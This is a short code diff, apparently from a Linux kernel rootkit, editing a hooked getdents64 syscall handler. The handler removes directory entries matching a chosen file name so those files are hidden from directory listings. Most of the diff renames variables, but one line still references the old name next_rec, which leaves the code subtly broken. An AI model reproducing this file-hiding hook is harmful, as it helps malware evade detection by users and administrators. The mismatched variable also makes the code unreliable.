@@ -25,25 +25,26 @@ d_name:   Filename (null-terminated)
 
 nob:  number of bytes (of all dirent structs)
 dirp: directory entry struct pointer
-cur:  tmp dirp
+curr: current dirp
+next: next    dirp
 */
   int nob = getdents64_original(fd, dirp, count);
-  struct linux_dirent64 *cur = dirp;
+  struct linux_dirent64 *curr = dirp;
 
   int i = 0;
   while(i < nob) {
-    int size = cur->d_reclen;
+    int size = curr->d_reclen;
 
-    if(strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
-      char *next_rec = (char *)cur + size;
+    if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+      char *next = (char *)curr + size;
       int len = (uintptr_t)dirp + nob - (uintptr_t)next_rec;
-      memmove(cur, next_rec, len);
+      memmove(curr, next, len);
       nob -= size;
       continue;
     }
 
     i += size;
-    cur = (struct linux_dirent64*) ((char*)dirp + i);
+    curr = (struct linux_dirent64*) ((char*)dirp + i);
   }
 
   return nob;
